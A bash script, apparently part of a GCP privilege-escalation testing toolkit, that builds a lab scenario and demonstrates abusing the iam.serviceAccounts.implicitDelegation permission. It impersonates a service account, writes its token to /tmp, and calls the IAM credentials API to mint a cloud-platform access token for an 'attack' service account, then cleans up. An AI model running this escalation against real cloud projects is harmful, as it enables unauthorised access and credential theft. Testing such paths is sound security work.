#!/bin/bash

source lib/lib.sh

echo "================================================"
echo "Checking iam.serviceAccounts.implicitDelegation"

TEMP_ROLE="a$(openssl rand -hex 12)"

create_one_sa "implicitdelegationsa"
create_role "iam.serviceAccounts.getAccessToken" "${TEMP_ROLE}" 
bind_sa_with_role "implicitdelegationsa" "${TEMP_ROLE}"

modify_role "iam.serviceAccounts.implicitDelegation"

sleep 10

# Get access token of SA to use
gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com" \
  auth print-access-token > /tmp/privesc_gcp

curl "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com:generateAccessToken?access_token=$(cat /tmp/privesc_gcp)" \
  -d "{\"delegates\":[\"projects/-/serviceAccounts/implicitdelegationsa@${PROJECT_ID}.iam.gserviceaccount.com\"], \"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}" -H "Content-Type: application/json"

# Cleaning
echo "You should see a token before this message"
read -p "Press any key to delete scenario... " -n1 -s
echo ""

rm /tmp/privesc_gcp

delete_role "${TEMP_ROLE}"
delete_sa "implicitdelegationsa"

echo "================================================"
